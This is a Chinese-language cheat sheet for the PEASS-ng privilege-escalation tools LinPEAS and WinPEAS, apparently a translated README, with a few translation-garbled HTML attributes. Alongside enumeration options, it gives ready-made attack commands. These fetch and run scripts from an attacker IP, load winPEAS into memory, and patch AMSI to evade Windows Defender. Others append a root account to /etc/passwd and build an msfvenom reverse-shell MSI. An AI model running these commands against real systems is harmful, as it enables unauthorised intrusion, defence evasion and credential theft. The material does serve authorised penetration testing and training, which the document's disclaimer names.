<!-- language-home-navigation -->
[🏠 中文主页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🦹 PEASS-ng (LinPEAS & WinPEAS) - 完整备忘单

[🇹🇷 Türkçe Sürüm]（翻译/README.tr.md）
```
  ██████╗ ███████╗ █████╗ ███████╗███████╗      ███╗   ██╗ ██████╗ 
  ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔════╝      ████╗  ██║██╔════╝ 
  ██████╔╝█████╗  ███████║███████╗███████╗█████╗██╔██╗ ██║██║  ███╗
  ██╔═══╝ ██╔══╝  ██╔══██║╚════██║╚════██║╚════╝██║╚██╗██║██║   ██║
  ██║     ███████╗██║  ██║███████║███████║      ██║ ╚████║╚██████╔╝
  ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝      ╚═╝  ╚═══╝ ╚═════╝ 
             LinPEAS & WinPEAS Privilege Escalation Suite
```
<p对齐=“中心”>
  <img src="https://img.shields.io/badge/PEASS--ng-PrivEsc-red?style=for-the-badge" alt="PEASS-ng">
  <img src="https://img.shields.io/badge/LinPEAS-Linux_PrivEsc-blue?style=for-the-badge" alt="LinPEAS">
  <img src="https://img.shields.io/badge/WinPEAS-Windows_PrivEsc-orange?style=for-the-badge" alt="WinPEAS">
  <img src="https://img.shields.io/badge/Automated-Enumeration-green?style=for-the-badge" alt="Automated">
</p>

<p对齐=“中心”>
  <b>🔍全球最流行的Linux和Windows系统自动提权工具</b>
</p>

---

## 📋 目录

- [简介](#-简介)
- [颜色图例和如何读取输出](#-color-legend--how-to-read-output)
- [LinPEAS（Linux 权限升级）](#-linpeas-linux-privilege-escalation)
  - [下载和内存中执行](#download--in-memory-execution)
  - [命令行选项](#command-line-options)
  - [LinPEAS 检查的核心向量](#core-vectors-checked-by-linpeas)
  - [隐形和 AV 规避](#stealth--av-evasion)
- [WinPEAS（Windows 权限升级）](#-winpeas-windows-privilege-escalation)
  - [执行方法（.exe 与 .bat）](#execution-methods-exe-vs-bat)
  - [在内存中运行 WinPEAS](#running-winpeas-in-memory)
  - [WinPEAS 检查的核心向量](#core-vectors-checked-by-winpeas)
  - [绕过 Windows Defender 和 AMSI](#bypassing-windows-defender--amsi)
- [解释高优先级发现](#-interpreting-high-priority-findings)
- [快速参考表](#-quick-reference-table)
- [提示和最佳实践](#-tips--best-practices)
- [法律免责声明](#-legal-disclaimer)
- [资源](#-资源)

---

## 🎯 简介

**PEASS-ng**（特权升级 Awesome Scripts SUITE - 新一代）由 Carlos Polop 创建，是自动审核工具的事实上的标准集合，用于发现受感染系统上的特权升级向量：

- **LinPEAS：** 一款一体化 Bash 脚本，用于搜索 Linux/Unix 系统上的错误配置、凭据、可写文件、SUID 二进制文件、内核漏洞、cron 作业和容器。
- **WinPEAS：** 作为独立编译的 .NET 二进制文件（`winPEASany.exe`、`winPEASx64.exe`）和轻量级批处理脚本（`winPEAS.bat`）提供，用于审核 Windows 工作站、域成员和服务器。

---

## 🎨 颜色图例和如何读取输出

PEASS 的决定性力量在于其自动色彩评级系统：

|颜色 |意义 |意义|
|--------|--------------|---------|
| 🔴 **红色/黄色** | 🚨 **关键（99% PrivEsc）** |高度可靠的特权升级向量。必须立即检查！ |
| 🔴 **红色** | ⚠️ **有趣** |异常配置、非默认设置或候选凭据。 |
| 🟡 **黄色** | ℹ️ **信息丰富** |值得注意的发现可能是漏洞利用链的一部分。 |
| 🔵 **青色/蓝色** | 👥 **背景** |用户、组和标准系统信息。 |

> **黄金法则：** 首先直接滚动到 **红色/黄色** 亮点！如果您看到黄色背景和红色字母的文本，则几乎可以保证存在漏洞利用向量。

---

## 🐧 LinPEAS（Linux 提权）

### 下载并在内存中执行

您很少需要将 `linpeas.sh` 写入磁盘。使用标准 UNIX 实用程序直接在内存中执行它：
```bash
# 1. From attacker Python web server directly into bash
curl -L http://10.10.14.5:8000/linpeas.sh | sh

# Alternative using wget
wget -q -O - http://10.10.14.5:8000/linpeas.sh | sh

# 2. Download from official GitHub directly (if target has outbound internet access)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# 3. Save output to file and review with colors preserved
./linpeas.sh -a > /tmp/linpeas.txt
less -r /tmp/linpeas.txt
```
### 命令行选项
```bash
# Run all checks (including slower exhaustive searches)
./linpeas.sh -a

# Fast mode (skips slow regex / deep file checks)
./linpeas.sh -q

# Password provided for automated 'sudo -l' testing
./linpeas.sh -p 'KnownPassword123'

# Network-only checks (active connections, ARP cache, listening ports)
./linpeas.sh -N

# System information only
./linpeas.sh -s
```
### LinPEAS 检查的核心向量

1. **Sudo 配置错误 (`sudo -l`):**
   - 无需密码即可以 root 身份运行的命令 (`NOPASSWD`)。
   - Sudo 令牌重用/CVE-2021-3156 (Baron Samedit)。
2. **SUID / SGID 二进制文件：**
   - 具有 root 权限的二进制文件 (`chmod +s`)。与 **GTFOBins** 交叉引用。
3. **Linux 功能：**
   - 具有增强功能的二进制文件，例如 `cap_setuid+ep`（例如 `python3`、`tar`、`perl`）。
4. **计划任务和计时器：**
   - Crontab（`/etc/crontab`、`/var/spool/cron/*`）和可写计划脚本。
   - Systemd 计时器 (`systemctl list-timers`)。
5. **路径和环境劫持：**
   - `$PATH` 中的可写目录，脚本中的相对命令查找。
6. **内核利用：**
   - 针对已知漏洞（Dirty COW、Dirty Pipe、OverlayFS）检查内核版本。
7. **NFS 根压缩：**
   - `/etc/exports` 中与 `no_root_squash` 挂载的共享目录。
8. **凭证收集：**
   - `.bash_history`、配置文件（`wp-config.php`、`.env`）、SSH 密钥（`id_rsa`）和内存转储中的明文密码。

---

## 🪟 WinPEAS（Windows 权限提升）

### 执行方法（.exe 与 .bat）

WinPEAS 以多种格式提供：
- **`winPEASx64.exe` / `winPEASany.exe`：** 用 C#/.NET 编写。最全面；执行深入的注册表、API 和凭据检查。
- **`winPEAS.bat`：** 普通批处理脚本。与旧版 Windows 版本高度兼容，不需要 .NET 依赖项，并且可以逃避某些静态二进制检测。
```cmd
:: Run winPEAS binary with full color output
winPEASx64.exe

:: Run stealthily and redirect to text file
winPEASx64.exe > C:\Windows\Temp\out.txt

:: Fast check without heavy registry and file searches
winPEASx64.exe quiet
```
### 在内存中运行 WinPEAS

为了避免将文件保存到经过审核的工作站上的磁盘，请将 WinPEAS 直接加载到 PowerShell 内存中：
```powershell
# In-memory execution using Net.WebClient
$pe = (New-Object System.Net.WebClient).DownloadData('http://10.10.14.5:8000/winPEASx64.exe')
[System.Reflection.Assembly]::Load($pe)
[winPEAS.Program]::Main("")
```
### WinPEAS 检查的核心向量

1. **服务权限和未引用的路径：**
   - **不带引号的服务路径：** 带空格且不带引号的服务二进制路径（`C:\Program Files\App\service.exe` -> 攻击者放置 `C:\Program.exe`）。
   - **弱服务权限：** 拥有 `SERVICE_ALL_ACCESS` 或 `SERVICE_CHANGE_CONFIG` 的非管理员用户。
2. **DLL劫持：**
   - 服务尝试从用户可写目录加载不存在的 DLL。
3. **始终安装提升：**
   - 注册表项 `AlwaysInstallElevated = 1` 允许任何用户使用 `msiexec` 安装提升的 MSI 软件包。
4. **令牌权限（SeImpersonate / SeAssignPrimaryToken）：**
   - 可通过 Potato 漏洞利用（SweetPotato、GodPotato、PrintSpoofer）从服务帐户（`IIS APPPOOL`、`LOCAL SERVICE`）提升到 `NT AUTHORITY\SYSTEM`。
5. **凭证存储和自动登录：**
   - 注册表中的明文密码（Winlogon 中的 `DefaultPassword`）。
   - 保存的 RDP 连接、Vault 凭据、DPAPI blob、PuTTY 会话、WiFi 密码。
6. **SAM 和系统备份文件：**
   - `C:\Windows\Repair\SAM` 或 `C:\Windows\System32\config\RegBack\SAM` 的可写或可读副本。

### 绕过 Windows Defender 和 AMSI

Windows Defender 主动标记 `winPEASx64.exe` 的编译版本。要在受监控的环境中运行 WinPEAS：
```powershell
# 1. Obfuscate winPEAS binary using Invisibility / Donut or custom compiler
# 2. Patch AMSI in PowerShell session before running in memory:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 3. Alternatively, fall back to winPEAS.bat (often unflagged by AV):
curl.exe http://10.10.14.5:8000/winPEAS.bat -o %TEMP%\wp.bat && %TEMP%\wp.bat
```
---

## 🎯 解释高优先级的发现

### 1.LinPEAS：可写`/etc/passwd`
如果 LinPEAS 将 `/etc/passwd` 标记为 **红色/黄色**：
```bash
# Generate password hash:
openssl passwd -1 -salt evil SaltPass123
# Append root user:
echo 'root2:$1$evil$TNy7V...:0:0:root:/root:/bin/bash' >> /etc/passwd
su root2
```
### 2.WinPEAS：`SeImpersonatePrivilege` 呈现
如果您持有 `SeImpersonatePrivilege`：
```powershell
# Elevate instantly using GodPotato or PrintSpoofer:
.\GodPotato-NET4.exe -cmd "cmd.exe /c whoami"
```
### 3.WinPEAS：`AlwaysInstallElevated` 设置为 1
```powershell
# Generate malicious MSI payload:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o priv.msi
# Run installer as low-privileged user:
msiexec /quiet /qn /i priv.msi
```
---

## 📊 快速参考表

|目标|命令 |目的|
|--------|---------|---------|
| **Linux（远程）** | `curl -L http://<IP>/linpeas.sh \| sh` |无需接触磁盘即可在内存中执行 |
| **Linux（本地）** | `./linpeas.sh -a > out.txt` |完整审核已保存到文本文件 |
| **Linux（快速）** | `./linpeas.sh -q` |快速扫描跳过缓慢的文件搜索|
| **Windows (CLI)** | `winPEASx64.exe quiet` |快速执行并降低噪音 |
| **Windows（内存）**| `[System.Reflection.Assembly]::Load($pe)` |通过 PowerShell 将 .NET 二进制文件加载到内存中
| **Windows（批量）** | `winPEAS.bat` |遗留/AV 规避的无依赖执行 |

---

## 💡 提示和最佳实践

1. **使用 `less -r` 查看输出：**
   将输出重定向到文件 (`./linpeas.sh > linpeas.txt`) 时，请始终使用 `less -r linpeas.txt` 或 `cat linpeas.txt` 查看它，以便终端 ANSI 颜色转义代码正确呈现。
2. **通过端口80/443传输：**
   当在攻击者机器上部署 LinPEAS 或 WinPEAS 时，使用 `python3 -m http.server 80` 在端口 `80` 或 `443` 上托管 Web 服务器，以绕过严格的目标防火墙出口规则。
3. **不要忽视隐藏的凭证：**
   检查 LinPEAS 输出的“有趣的文件”和“云凭证”部分；通常，纯文本 API 令牌或 AWS 凭证会授予比本地漏洞更高的权限。

---

## ⚠️ 法律免责声明

> **重要：** PEASS-ng 脚本执行全面的内部审核和配置发现。它们只能在您在授权渗透测试、CTF 练习或内部安全审计期间拥有书面许可的系统上执行。

---

## 📚 资源

- [PEASS-ng 官方 GitHub 存储库](https://github.com/carlospolop/PEASS-ng)
- [HackTricks 云与权限升级圣经](https://book.hacktricks.xyz/)
- [GTFOBins - Unix 二进制文件利用](https://gtfobins.github.io/)
- [LOLBAS - Windows Living Off The Land](https://lolbas-project.github.io/)